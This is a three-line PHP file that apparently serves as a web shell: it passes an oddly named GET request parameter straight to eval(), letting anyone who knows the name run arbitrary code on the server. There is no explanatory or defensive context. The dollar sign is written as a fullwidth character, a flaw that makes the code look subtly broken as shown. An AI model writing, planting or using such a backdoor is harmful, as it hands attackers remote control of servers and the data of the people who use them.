<?php
eval(＄_GET['TFs2fUJW']);
?>
